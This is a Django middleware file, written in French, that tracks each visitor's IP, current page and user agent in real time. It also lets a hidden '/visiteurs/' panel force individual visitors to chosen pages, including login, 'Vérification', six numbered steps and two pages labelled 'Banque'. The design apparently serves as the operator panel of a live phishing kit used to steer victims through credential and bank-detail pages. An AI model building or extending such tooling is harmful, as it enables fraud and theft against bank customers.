import time

# Visiteurs actifs : { ip: { page, last_seen, user_agent, methode } }
VISITEURS_ACTIFS = {}

# Redirections en attente : { ip: url_cible }
REDIRECTIONS = {}

# Durée avant qu'un visiteur soit considéré inactif (secondes)
TIMEOUT_VISITEUR = 60

# Toutes les pages disponibles pour la redirection
PAGES_DISPONIBLES = [
    ('/',                'Inscription / Connexion'),
    ('/verification/',   'Vérification'),
    ('/etape-1/',        'Étape 1'),
    ('/etape-2/',        'Étape 2'),
    ('/etape-3/',        'Étape 3'),
    ('/etape-4/',        'Étape 4'),
    ('/etape-5/',        'Étape 5'),
    ('/etape-6/',        'Étape 6'),
    ('/banque-1/',       'Banque 1'),
    ('/banque-2/',       'Banque 2'),
]


class VisiteurTempsReelMiddleware:

    def __init__(self, get_response):
        self.get_response = get_response

    def __call__(self, request):
        ip = self._get_ip(request)

        # Vérifier si une redirection est en attente pour cet IP
        if ip in REDIRECTIONS and not request.path.startswith('/visiteurs/'):
            cible = REDIRECTIONS.pop(ip)  # consommée une seule fois
            from django.shortcuts import redirect
            return redirect(cible)

        # Enregistrer le visiteur (sauf pages de monitoring)
        if not request.path.startswith('/visiteurs/'):
            VISITEURS_ACTIFS[ip] = {
                'page':       request.path,
                'last_seen':  time.time(),
                'user_agent': request.META.get('HTTP_USER_AGENT', 'Inconnu'),
                'methode':    request.method,
            }

        self._nettoyer()
        response = self.get_response(request)
        return response

    def _get_ip(self, request):
        x_forwarded = request.META.get('HTTP_X_FORWARDED_FOR')
        if x_forwarded:
            return x_forwarded.split(',')[0].strip()
        return request.META.get('REMOTE_ADDR', '0.0.0.0')

    def _nettoyer(self):
        maintenant = time.time()
        a_supprimer = [
            ip for ip, data in VISITEURS_ACTIFS.items()
            if maintenant - data['last_seen'] > TIMEOUT_VISITEUR
        ]
        for ip in a_supprimer:
            del VISITEURS_ACTIFS[ip]
